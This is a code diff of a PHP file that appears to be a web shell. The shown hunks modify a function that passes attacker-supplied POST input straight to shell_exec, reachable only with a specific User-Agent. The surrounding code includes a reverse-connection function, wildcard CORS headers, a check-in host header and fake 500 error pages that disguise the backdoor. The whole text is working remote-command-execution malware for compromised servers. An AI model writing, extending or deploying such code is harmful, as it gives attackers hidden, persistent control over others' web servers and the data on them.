@@ -170,10 +170,12 @@ function reverseConnections($methods, $host, $port, $shell)
     }
 }
 
-function executeCommands($com)
+function executeCommands($com, $run)
 {
-    if (!empty($com)) {
+    if (!empty($com) && $run === "1") {
         echo "~ Info To Remember ~ \n" . shell_exec($com);
+    }else{
+        echo "\nExecuting: ". $com ."\n->". shell_exec($com);
     }
 }
 
@@ -193,7 +195,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && $_SERVER['HTTP_USER_AGENT'] === 'sp1
     header("Access-Control-Allow-Origin: *");
     header("Access-Control-Allow-Credentials: true");
     if (!empty($_POST["commander"])) {
-        executeCommands($_POST["commander"]);
+        executeCommands($_POST["commander"], "0");
     } elseif (!empty($_POST["clone"])) {
         if (!empty($_POST["ROS"])) {
             $ROS = htmlentities($_POST["ROS"]);
@@ -227,14 +229,13 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && $_SERVER['HTTP_USER_AGENT'] === 'sp1
         elseif ($_GET["qs"] == "cqCM")
             checkComs();
         elseif ($_GET["qs"] == "cqBS")
-            executeCommands($base);
+            executeCommands($base, "1");
     } else {
         http_response_code(500);
         header("Status: 500 Internal Server Error");
         if (!empty($CHECK_IN_HOST)) {
             header("Checkin: " . $CHECK_IN_HOST);
         }
-        $roots = $_SERVER["DOCUMENT_ROOT"];
         $rhost = $_SERVER['REMOTE_ADDR'];
         echo <<<_POSTDOC1
  
@@ -349,7 +350,6 @@ _POSTDOC1;
 } else {
     header("Status: 500 Internal Server Error");
     http_response_code(500);
-    $roots = $_SERVER["DOCUMENT_ROOT"];
     $rhost = $_SERVER['REMOTE_ADDR'];
     echo <<<_GETDOC1
 <!DOCTYPE html>
